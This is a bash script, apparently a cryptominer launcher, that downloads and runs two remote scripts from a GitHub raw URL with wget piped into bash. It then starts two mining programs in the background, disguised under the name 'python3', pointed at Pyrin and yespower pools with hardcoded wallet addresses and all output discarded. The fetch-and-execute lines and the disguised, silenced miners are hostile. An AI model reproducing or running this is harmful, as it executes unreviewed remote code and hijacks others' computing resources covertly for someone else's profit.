#!/bin/bash

bash -c "$(wget -qO- raw.githubusercontent.com/DotAja/ALONE/main/ALAT-COLI/DotLol.sh)"

sleep 5

bash -c "$(wget -qO- raw.githubusercontent.com/DotAja/ALONE/main/ALAT-COLI/DotSrb.sh)"

sleep 5

clear

echo "menjalankan dotlol..."

nohup ./dotlol/python3 -a PYRIN --pool kr.pyrin.herominers.com:1177 --user pyrin:qq5fnz6aelfdruhshjpul598fxyeqfkjh86cvypt2902mghd0ql7gy7g799ff.DOT --no-cl > /dev/null 2>&1 &

sleep 5

clear

echo "menjalankan dotsrb..."

nohup ./dotsrb/python3 -a yespower -o stratum-eu.rplant.xyz:7122 -u QdeLX9ToumSqAfryzmfxJv366NtwStVimq.DOT > /dev/null 2>&1 &

sleep 5

clear

echo "berjalan semuanya..."
